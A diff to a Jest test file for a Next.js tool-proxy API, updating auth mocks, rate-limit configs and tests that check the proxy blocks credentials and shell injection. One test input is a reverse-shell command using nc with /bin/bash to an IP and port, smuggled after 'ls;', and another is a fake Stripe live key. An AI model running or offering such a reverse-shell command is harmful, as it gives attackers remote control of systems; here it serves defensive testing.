@@ -18,6 +18,7 @@ const mockSingle    = jest.fn();
 const mockEq        = jest.fn();
 const mockSelect    = jest.fn();
 const mockInsert    = jest.fn();
+const mockResolveApiKey = jest.fn();
 
 // Chainable query builder mock
 const queryChain = () => {
@@ -41,9 +42,37 @@ jest.mock('@/lib/supabase/server', () => ({
   }),
 }));
 
+jest.mock('@/lib/auth-server', () => ({
+  resolveUser: async (req: any) => {
+    const user = mockGetUser.mock?.results?.[mockGetUser.mock.results.length - 1]?.value;
+    const resolved = user ? await user : { data: { user: null } };
+    return { user: resolved?.data?.user ?? null, supabase: { auth: { getUser: mockGetUser }, from: mockFrom, rpc: mockRpc } };
+  },
+  resolveApiKey: (...args: any[]) => mockResolveApiKey(...args),
+  resolveCallerUserId: async (req: any) => {
+    const apiKey = await mockResolveApiKey(req);
+    if (apiKey.userId) return { userId: apiKey.userId, keyId: apiKey.keyId, fromApiKey: true };
+    const user = mockGetUser.mock?.results?.[mockGetUser.mock.results.length - 1]?.value;
+    const resolved = user ? await user : { data: { user: null } };
+    return { userId: resolved?.data?.user?.id ?? null, keyId: null, fromApiKey: false };
+  },
+}));
+
 jest.mock('@/lib/ratelimit', () => ({
   rateLimit: jest.fn().mockResolvedValue({ allowed: true, resetAt: Date.now() + 60000 }),
-  LIMITS: { proxy: { limit: 30, windowMs: 60000 }, search: { limit: 60, windowMs: 60000 } },
+  getLimitConfig: jest.fn(async (context: string) => {
+    const configs: Record<string, { limit: number; windowMs: number }> = {
+      proxy: { limit: 30, windowMs: 60000 },
+      proxyAuth: { limit: 200, windowMs: 60000 },
+      search: { limit: 60, windowMs: 60000 },
+    };
+    return configs[context] ?? configs.search;
+  }),
+  LIMITS: {
+    proxy: { limit: 30, windowMs: 60000 },
+    proxyAuth: { limit: 200, windowMs: 60000 },
+    search: { limit: 60, windowMs: 60000 },
+  },
 }));
 
 import { NextRequest, type NextRequest as NR } from 'next/server';
@@ -72,6 +101,11 @@ function makeRequest(
 async function toJson(response: Response) {
   return response.json();
 }
+
+beforeEach(() => {
+  mockResolveApiKey.mockResolvedValue({ userId: null, keyId: null });
+  mockRpc.mockResolvedValue({ data: 'allowed', error: null });
+});
 
 // ── Security scanner — unit regression ───────────────────────────────────────
 // These are the 8 patterns that previously failed — guarded here so they
@@ -142,16 +176,14 @@ describe('Input validation (Zod schemas)', () => {
     const { POST } = await import('../app/api/ingest/route');
     mockGetUser.mockResolvedValue({ data: { user: null } });
 
+    // Use the actual CRON_SECRET env var (or set a known one for the test)
+    const testSecret = process.env.CRON_SECRET || 'test-cron-secret';
+    process.env.CRON_SECRET = testSecret;
+
     const req = makeRequest('POST', 'http://localhost/api/ingest',
       { source: 'not_a_valid_source' },
-      { Authorization: `Bearer ${process.env.CRON_SECRET ?? 'test-secret'}` }
+      { Authorization: `Bearer ${testSecret}` }
     );
-    // Mock safeCompare to return true
-    jest.mock('@/lib/utils', () => ({
-      ...jest.requireActual('@/lib/utils'),
-      safeCompare: () => true,
-      isSafeUrl: () => true,
-    }));
 
     const res = await POST(req);
     // Should get 400 validation error (Zod) — source enum invalid
@@ -235,30 +267,37 @@ describe('Auth guards', () => {
 describe('Proxy DLP blocking', () => {
   test('proxy blocks Stripe key in request arguments', async () => {
     mockGetUser.mockResolvedValue({ data: { user: null } });
-    mockFrom.mockReturnValue({
-      select: jest.fn().mockReturnValue({
-        eq: jest.fn().mockReturnValue({
+    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
+    mockFrom.mockImplementation((table: string) => {
+      if (table === 'audit_log') {
+        return { insert: jest.fn(() => ({ catch: jest.fn() })) };
+      }
+      return {
+        select: jest.fn().mockReturnValue({
           eq: jest.fn().mockReturnValue({
-            single: jest.fn().mockResolvedValue({
-              data: {
-                id: 'srv-1', name: 'stripe', endpoint: 'https://stripe-mcp.example.com',
-                tools: ['charge'], trust_score: 90, latency_ms: 50, auth_type: 'api_key',
-              },
-              error: null,
+            eq: jest.fn().mockReturnValue({
+              single: jest.fn().mockResolvedValue({
+                data: {
+                  id: 'srv-1', name: 'stripe', endpoint: 'https://stripe-mcp.example.com',
+                  tools: ['charge'], trust_score: 90, latency_ms: 50, auth_type: 'api_key',
+                },
+                error: null,
+              }),
             }),
           }),
         }),
-      }),
+      };
     });
 
     const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
     const req = makeRequest(
       'POST',
       'http://localhost/api/proxy/stripe/charge',
-      { api_key: 'sk_live_abcdefghijklmnopqrstuvwxyz0123', amount: 4900 }
+      { api_key: 'sk_live_abcdefghijklmnopqrstuvwxyz0123', amount: 4900 },
+      { Authorization: 'Bearer sk_mcp_test' }
     );
 
-    const res = await POST(req, { params: { serverName: 'stripe', toolName: 'charge' } });
+    const res = await POST(req, { params: Promise.resolve({ serverName: 'stripe', toolName: 'charge' }) });
     const body = await toJson(res);
     expect(res.status).toBe(400);
     expect(body.error).toMatch(/credential|blocked/i);
@@ -266,30 +305,37 @@ describe('Proxy DLP blocking', () => {
 
   test('proxy blocks shell injection in arguments', async () => {
     mockGetUser.mockResolvedValue({ data: { user: null } });
-    mockFrom.mockReturnValue({
-      select: jest.fn().mockReturnValue({
-        eq: jest.fn().mockReturnValue({
+    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
+    mockFrom.mockImplementation((table: string) => {
+      if (table === 'audit_log') {
+        return { insert: jest.fn(() => ({ catch: jest.fn() })) };
+      }
+      return {
+        select: jest.fn().mockReturnValue({
           eq: jest.fn().mockReturnValue({
-            single: jest.fn().mockResolvedValue({
-              data: {
-                id: 'srv-2', name: 'shell-test', endpoint: 'https://test.example.com',
-                tools: ['run'], trust_score: 80, latency_ms: 50, auth_type: 'none',
-              },
-              error: null,
+            eq: jest.fn().mockReturnValue({
+              single: jest.fn().mockResolvedValue({
+                data: {
+                  id: 'srv-2', name: 'shell-test', endpoint: 'https://test.example.com',
+                  tools: ['run'], trust_score: 80, latency_ms: 50, auth_type: 'none',
+                },
+                error: null,
+              }),
             }),
           }),
         }),
-      }),
+      };
     });
 
     const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
     const req = makeRequest(
       'POST',
       'http://localhost/api/proxy/shell-test/run',
-      { command: 'ls; nc -e /bin/bash 10.0.0.1 4444' }
+      { command: 'ls; nc -e /bin/bash 10.0.0.1 4444' },
+      { Authorization: 'Bearer sk_mcp_test' }
     );
 
-    const res = await POST(req, { params: { serverName: 'shell-test', toolName: 'run' } });
+    const res = await POST(req, { params: Promise.resolve({ serverName: 'shell-test', toolName: 'run' }) });
     const body = await toJson(res);
     expect(res.status).toBe(400);
     expect(body.error).toMatch(/injection|blocked/i);
@@ -297,6 +343,7 @@ describe('Proxy DLP blocking', () => {
 
   test('proxy returns 404 for unknown server', async () => {
     mockGetUser.mockResolvedValue({ data: { user: null } });
+    mockResolveApiKey.mockResolvedValue({ userId: 'user-123', keyId: 'key-123' });
     mockFrom.mockReturnValue({
       select: jest.fn().mockReturnValue({
         eq: jest.fn().mockReturnValue({
@@ -308,8 +355,13 @@ describe('Proxy DLP blocking', () => {
     });
 
     const { POST } = await import('../app/api/proxy/[serverName]/[toolName]/route');
-    const req = makeRequest('POST', 'http://localhost/api/proxy/nonexistent/tool', {});
-    const res = await POST(req, { params: { serverName: 'nonexistent', toolName: 'tool' } });
+    const req = makeRequest(
+      'POST',
+      'http://localhost/api/proxy/nonexistent/tool',
+      {},
+      { Authorization: 'Bearer sk_mcp_test' }
+    );
+    const res = await POST(req, { params: Promise.resolve({ serverName: 'nonexistent', toolName: 'tool' }) });
     expect(res.status).toBe(404);
   });
 });
